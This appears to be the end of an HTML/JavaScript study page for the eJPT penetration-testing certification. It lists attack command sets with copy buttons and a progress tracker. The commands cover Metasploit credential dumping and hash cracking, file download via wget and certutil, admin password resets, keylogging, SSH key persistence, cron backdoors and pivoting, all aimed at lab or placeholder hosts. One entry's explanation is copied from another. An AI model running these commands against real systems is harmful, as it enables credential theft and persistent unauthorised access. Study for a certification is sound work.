+		"use post/linux/gather/hashdump",
+		"use auxiliary/analyze/crack_linux",
+		], 
+		intel: "Dumped password hashes can be cracked offline to reveal plaintext credentials.", next: "Use cracked credentials for privilege escalation or pivoting." },
+	{ 
+	id: "post-15", 
+	stage: "Post Exploitation", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Linux Post Exploitation Metasploit Modules", 
+	commands: [
+		"use post/linux/gather/enum_configs",
+		"use post/multi/gather/env",
+		"use post/linux/gather/enum_network",
+		"use post/linux/gather/enum_protections",
+		"use post/linux/gather/enum_system",
+		"use post/linux/gather/checkcontainer",
+		"use post/linux/gather/checkvm",
+		"use post/linux/gather/enum_users_history",
+		"use post/multi/manage/system_session",
+		"use post/multi/gather/ssh_creds",
+		"use post/multi/gather/docker_creds",
+		"use post/linux/gather/hashdump",
+		"use post/linux/gather/ecryptfs_creds",
+		"use post/linux/gather/enum_psk",
+		"use post/linux/gather/enum_xchat",
+		"use post/linux/gather/phpmyadmin_credsteal",
+		"use post/linux/gather/pptpd_chap_secrets",
+		"use post/linux/manage/sshkey_persistence"
+		], 
+		intel: "Post modules automate gathering of configs, creds, environment, and system data.", next: "Analyze gathered loot for credential reuse or lateral movement." },
+	{ 
+	id: "post-16", 
+	stage: "Post Exploitation", 
+	tool: "john-the-ripper", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Hash Cracking", 
+	commands: [
+		"hashdump", 
+		"use auxiliary/analyze/crack_windows", 
+		"type hashdump.txt",
+		"john --format=NT hashdump.txt",
+		], 
+		intel: "Weak NTLM or Linux hashes can be cracked using wordlists or brute force.", next: "Reuse cracked credentials on other services or hosts." },
+	{ 
+	id: "post-17", 
+	stage: "Post Exploitation", 
+	tool: "python, certutil, wget", 
+	weight: 25, 
+	rank: 11, 
+	objective: "File Transfering", 
+	commands: [
+		"python -m SimpleHTTPServer 80",
+		"python3 -m http.server 8080",
+		"certutil -urlcache -f http://10.10.31.2/filename.txt filename.txt  -- Windows", 
+		"wget http://10.10.10.10/filename.txt"
+		], 
+		intel: "Weak NTLM or Linux hashes can be cracked using wordlists or brute force.", next: "Reuse cracked credentials on other services or hosts." },
+	{ 
+	id: "persis-1", 
+	stage: "Persistence", 
+	tool: "xfreerdp", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Windows: Enabling Remote Desktop", 
+	commands: [
+		"nmap -sV -p 80 example.com", 
+		"searchsploit badblue 2.7", 
+		"use exploit/windows/http/badblue_passthru",
+		"use post/windows/manage/enable_rdp",
+		"shell",
+		"net user administrator hacker_123321",
+		"xfreerdp /u:administrator /p:hacker_123321 /v:example.com"
+		], 
+		intel: "Enabling RDP provides persistent graphical access to compromised host.", next: "Create or modify admin credentials for continued access." },
+	{ 
+	id: "persis-2", 
+	stage: "Persistence", 
+	tool: "metasploit",
+	weight: 25, 
+	rank: 11, 
+	objective: "Windows: File and Keylogging", 
+	commands: [
+		"nmap -sV -p 80 example.com", 
+		"searchsploit badblue 2.7", 
+		"use exploit/windows/http/badblue_passthru",
+		"keyscan_start",
+		"keyscan_dump",
+		], 
+		intel: "Keylogging captures plaintext credentials during user activity.", next: "Use captured credentials to maintain persistent privileged access." },
+	{ 
+	id: "persis-3", 
+	stage: "Persistence", 
+	tool: "metasploit", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Establishing Persistence on Linux via SSH_Key", 
+	commands: [
+		"nmap -sS -sV example.com", 
+		"use auxiliary/scanner/ssh/ssh_login", 
+		"use exploit/unix/local/chkrootkit",
+		"set CHKROOTKIT /bin/chkrootkit",
+		"use post/linux/manage/sshkey_persistence",
+		"cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key",
+		"chmod 0400 ssh_key",
+		"ssh -i ssh_key root@example.com",
+		"Alternative method of transfering ssh_key file",
+		"ssh student@example.com",
+		"ls -al",
+		"scp student@example.com:~/.ssh/id_rsa .",
+		"chmod 400 id_rsa",
+		"ssh -i id_rsa student@example.com"
+		], 
+		intel: "Adding attacker SSH key enables passwordless persistent access.", next: "Test SSH access and remove traces of initial compromise." },
+	{ 
+	id: "persis-4", 
+	stage: "Persistence", 
+	tool: "Linux Internal", 
+	weight: 25, 
+	rank: 11, 
+	objective: "Establishing Persistence on Linux via Local Job Scheduling", 
+	commands: [
+		"ssh student@example.com", 
+		"ps -eaf", 
+		"echo ''* * * * * cd /home/student/ && python -m SimpleHTTPServer'' > cron",
+		"crontab -i cron",
+		"crontab -l",
+		"curl example.com:8000"
+		], 
+		intel: "Cron jobs can maintain recurring backdoor execution.", next: "Verify cron execution and ensure callback connectivity." },
+	{ 
+	id: "pivot-1", 
+	stage: "Pivoting", 
+	tool: "metasploit", 
+	weight: 10, 
+	rank: 8, 
+	objective: "Pivoting via Autoroute & Port Forward", 
+	commands: [
+		"nmap -sV -p80 example1.com", 
+		"use exploit/windows/http/rejetto_hfs_exec",
+		"run autoroute -s 10.0.19.0/20",
+		"use auxiliary/scanner/portscan/tcp",
+		"portfwd add -l 1234 -p 80 -r",
+		"portfwd list",
+		"nmap -sV -sS -p 1234 localhost",
+		"searchsploit badblue 2.7",
+		"use exploit/windows/http/badblue_passthru"
+		], 
+		intel: "Autoroute and port forwarding allow access to internal subnets from compromised host.", next: "Scan internal network and identify new attack targets." },
+	{ 
+	id: "pivot-2", 
+	stage: "Pivoting", 
+	tool: "proxychain", 
+	weight: 10, 
+	rank: 8, 
+	objective: "Pivoting via Proxychain", 
+	commands: [
+		"run autoroute -s 10.0.28.125/20", 
+		"cat /etc/proxychains4.conf",
+		"use auxiliary/server/socks_proxy",
+		"set SRVPORT 9050",
+		"set VERSION 4a",
+		"proxychains nmap demo1.ine.local -sT -Pn -sV -p 445",
+		"net view 10.0.28.125",
+		"migrate -N explorer.exe",
+		"net view 10.0.28.125"
+		], 
+		intel: "SOCKS proxy enables routing tools like Nmap through compromised machine.", next: "Enumerate internal services and exploit discovered vulnerabilities." }
+];
+
+let appState = {
+    completed: JSON.parse(localStorage.getItem('ejpt_tactical_v2')) || [],
+    examMode: false,
+    blackBox: false,
+    stageFilter: 'all',
+    toolFilter: 'all'
+};
+
+function init() {
+    render();
+    setupEvents();
+    updateProgress();
+}
+
+function render() {
+    const list = document.getElementById('methodology-list');
+    list.innerHTML = '';
+    
+    let tasks = [...methodologyData];
+    if (appState.blackBox) tasks.sort((a, b) => a.rank - b.rank);
+    
+    tasks = tasks.filter(t => {
+        const stageMatch = appState.stageFilter === 'all' || t.stage === appState.stageFilter;
+        const toolMatch = appState.toolFilter === 'all' || t.tool === appState.toolFilter;
+        return stageMatch && toolMatch;
+    });
+
+    tasks.forEach(task => {
+        const isDone = appState.completed.includes(task.id);
+        const card = document.createElement('div');
+        card.className = `card ${isDone ? 'completed' : ''}`;
+        card.id = `card-${task.id}`;
+        card.innerHTML = `
+            <div class="card-header" onclick="toggleCard('${task.id}')">
+                <div style="display:flex; flex-direction:column; gap:5px;">
+                    <div>
+                        <span class="badge">${task.tool.toUpperCase()}</span>
+                        <span style="font-size:12px; color:var(--accent)">Weight: ${task.weight}%</span>
+                    </div>
+                    <h3 style="margin: 0;">${task.objective}</h3>
+                </div>
+                <div style="display:flex; align-items:center; gap:15px;">
+                    <input type="checkbox" ${isDone ? 'checked' : ''} onclick="event.stopPropagation(); toggleTask('${task.id}')" style="transform: scale(1.4); cursor:pointer;">
+                    <span class="expand-indicator">▼</span>
+                </div>
+            </div>
+            <div class="command-section">
+                ${task.commands.map(cmd => `
+                    <div class="terminal">
+                        ${cmd}
+                        <button class="copy-btn" onclick="event.stopPropagation(); copyText('${cmd}')">COPY</button>
+                    </div>
+                `).join('')}
+                <div class="intel ${appState.examMode ? 'hidden' : ''}">
+                    <strong>Intelligence Layer:</strong> ${task.intel}
+                    <div style="color:var(--secondary); margin-top:8px;"><strong>Next Logical Step:</strong> ${task.next}</div>
+                </div>
+            </div>
+        `;
+        list.appendChild(card);
+    });
+}
+
+function toggleCard(id) {
+    const card = document.getElementById(`card-${id}`);
+    card.classList.toggle('expanded');
+}
+
+function toggleTask(id) {
+    if (appState.completed.includes(id)) {
+        appState.completed = appState.completed.filter(i => i !== id);
+    } else {
+        appState.completed.push(id);
+    }
+    localStorage.setItem('ejpt_tactical_v2', JSON.stringify(appState.completed));
+    updateProgress();
+    render();
+}
+
+function updateProgress() {
+    const weights = { "Enumeration": 25, "Host & Networking": 25, "Exploitation": 35, "Pivoting": 5, "Post Exploitation": 10 };
+    let score = 0;
+    Object.keys(weights).forEach(s => {
+        const stageTasks = methodologyData.filter(t => t.stage === s);
+        const done = stageTasks.filter(t => appState.completed.includes(t.id)).length;
+        if (stageTasks.length > 0) score += (done / stageTasks.length) * weights[s];
+    });
+    const total = Math.min(Math.round(score), 100);
+    document.getElementById('total-progress').style.width = total + '%';
+    document.getElementById('readiness-pct').innerText = total + '%';
+}
+
+function setupEvents() {
+    document.getElementById('examMode').onchange = (e) => { appState.examMode = e.target.checked; render(); };
+    document.getElementById('blackBox').onchange = (e) => { appState.blackBox = e.target.checked; render(); };
+    document.getElementById('toolFilter').onchange = (e) => { appState.toolFilter = e.target.value; render(); };
+    document.getElementById('stageBtns').onclick = (e) => {
+        if (e.target.tagName === 'BUTTON') {
+            document.querySelectorAll('#stageBtns button').forEach(b => b.classList.remove('active'));
+            e.target.classList.add('active');
+            appState.stageFilter = e.target.dataset.stage;
+            render();
+        }
+    };
+}
+
+function copyText(txt) {
+    navigator.clipboard.writeText(txt);
+}
+
+init();
+</script>
+</body>
+</html>
